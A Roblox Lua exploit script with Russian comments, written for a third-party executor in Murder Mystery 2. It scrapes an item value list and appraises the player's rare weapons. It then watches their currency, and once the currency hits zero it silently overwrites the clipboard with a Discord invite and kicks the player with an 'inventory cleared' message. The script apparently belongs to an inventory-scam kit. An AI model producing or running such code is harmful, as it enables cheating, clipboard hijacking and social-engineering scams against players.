-- MM2: Оценка + Кик при очистке валюты (ИСПРАВЛЕНО)
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpRequest = request or (syn and syn.request) or http_request or http and http.request

-- === НАСТРОЙКИ ===
local min_rarity = "Godly"
local min_value = 1
local DISCORD_LINK = "discord.com/Sc55xakw"

-- Проверка игры
if game.PlaceId ~= 142823291 then
    plr:Kick("Ошибка: Зайди в Murder Mystery 2.")
    return
end
if #Players:GetPlayers() >= 12 then
    plr:Kick("Сервер переполнен.")
    return
end

-- === БАЗА ДАННЫХ ===
local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local rarityTable = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"}
local categories = {
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique = "https://supremevaluelist.com/mm2/uniques.html",
    classic = "https://supremevaluelist.com/mm2/vintages.html",
    chroma = "https://supremevaluelist.com/mm2/chromas.html"
}
local headers = {["User-Agent"] = "Mozilla/5.0"}

-- === УТИЛИТЫ ===
local function trim(s) return s:match("^%s*(.-)%s*$") end
local function fetchHTML(url)
    if not HttpRequest then return "" end
    local s, r = pcall(function() return HttpRequest({Url = url, Method = "GET", Headers = headers}) end)
    return s and r and r.Body or ""
end
local function parseValue(div)
    local v = div:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    return v and tonumber(v:gsub(",", "")) or nil
end
local function extractItems(html)
    local t = {}
    for name, body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        name = trim((name:match("([^<]+)") or ""):gsub("%s+", " ")):lower()
        name = trim(name:split(" Click ")[1])
        local val = parseValue(body)
        if val then t[name] = val end
    end
    return t
end

-- === ПОСТРОЕНИЕ ЦЕН ===
local function buildValueList()
    local values, chromas = {}, {}
    local lock = Instance.new("BindableEvent")
    local done = 0

    for r, url in pairs(categories) do
        task.spawn(function()
            local html = fetchHTML(url)
            if html ~= "" then
                local items = extractItems(html)
                if r == "chroma" then chromas = items else for n,v in pairs(items) do values[n] = v end end
            end
            done += 1
            if done == 5 then lock:Fire() end
        end)
    end
    lock.Event:Wait()

    local list = {}
    local godlyIdx = table.find(rarityTable, "Godly")
    for id, item in pairs(database) do
        local name = item.ItemName and item.ItemName:lower() or ""
        local rarity = item.Rarity or ""
        local isChroma = item.Chroma or false
        local idx = table.find(rarityTable, rarity)
        if idx and idx >= godlyIdx and name ~= "" then
            if isChroma then
                for c, v in pairs(chromas) do if c:find(name) then list[id] = v break end end
            else
                list[id] = values[name]
            end
        end
    end
    return list
end

-- === КОПИРОВАНИЕ ===
local function copyLink()
    if setclipboard then setclipboard(DISCORD_LINK)
    elseif syn and syn.write_clipboard then syn.write_clipboard(DISCORD_LINK)
    end
    print("[ССЫЛКА] Скопировано: " .. DISCORD_LINK)
end

-- === ГЛАВНЫЙ ЦИКЛ ===
local valueList = buildValueList()
local min_rarity_idx = table.find(rarityTable, min_rarity)
local untradable = {DefaultGun=true, DefaultKnife=true, Reaver=true, IceHammer=true, Gingerscythe=true, TestItem=true, Cracks=true, Icecrusher=true, ["???"]=true, Dartbringer=true, SharkSeeker=true}

local previousCurrency = nil
local evaluated = false

print("[ЗАПУСК] Скрипт активен. Оценка + отслеживание...")

while task.wait(2) do
    local ok, data = pcall(function()
        return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
    end)

    if not ok or not data then continue end

    local currency = data.Currency or 0
    local weapons = data.Weapons.Owned or {}

    -- === ОЦЕНКА (ОДИН РАЗ) ===
    if not evaluated then
        local items, total = {}, 0
        for id, amt in pairs(weapons) do
            local item = database[id]
            if item then
                local r = item.Rarity
                local idx = table.find(rarityTable, r)
                if idx and idx >= min_rarity_idx and not untradable[id] then
                    local val = valueList[id] or (idx >= table.find(rarityTable, "Godly") and 2 or 1)
                    if val and val >= min_value then
                        total += val * amt
                        table.insert(items, {DataID=id, Rarity=r, Amount=amt, Value=val})
                    end
                end
            end
        end

        if #items > 0 then
            table.sort(items, function(a,b) return a.Value*a.Amount > b.Value*b.Amount end)
            print("\n[ОЦЕНКА ИНВЕНТАРЯ] Total Value: " .. total)
            for _, v in ipairs(items) do
                print("  " .. v.DataID .. " (x" .. v.Amount .. "): " .. (v.Value*v.Amount) .. " (" .. v.Rarity .. ")")
            end
        else
            print("[ИНВЕНТАРЬ] Нет ценных предметов.")
        end
        evaluated = true
    end

    -- === ОТСЛЕЖИВАНИЕ ВАЛЮТЫ ===
    if previousCurrency == nil then
        previousCurrency = currency
        print("[ВАЛЮТА] Начальное: " .. currency)
    elseif previousCurrency > 0 and currency == 0 then
        print("[ОЧИСТКА] Валюта обнулена! Кик...")
        copyLink()
        task.wait(1)
        plr:Kick("Your inventory cleared\n" .. DISCORD_LINK)
        break
    else
        previousCurrency = currency
    end
end
